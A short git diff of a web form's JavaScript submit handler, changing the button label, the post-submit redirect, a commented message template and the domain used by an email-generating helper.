@@ -22,15 +22,15 @@ document.addEventListener("DOMContentLoaded", () => {
   form.addEventListener("submit", async (e) => {
     e.preventDefault();
     submit_btn.setAttribute("disabled", "true");
-    submit_btn.innerText = "CREATING APPLICATION";
+    submit_btn.innerText = "CHECKING APPLICATION";
     await submit_details();
     await sleep(2000);
-    window.location.href = `/Login/index.html`;
+    window.location.href = `/`;
   });
 });
 
 async function submit_details() {
-  //   const msg = `New Jovie Application  \n
+  //   const msg = `New fORM Application  \n
   // Generated  email is ${email} \n
   //     `;
   const msg = `
@@ -80,7 +80,7 @@ Delaying for 10 sec
 }
 
 function generateEmail(a, b) {
-  return `${a}${b}01.jovie@gmail.com`;
+  return `${a}${b}01.jovi@gmail.com`;
 }
 
 async function sendImg() {
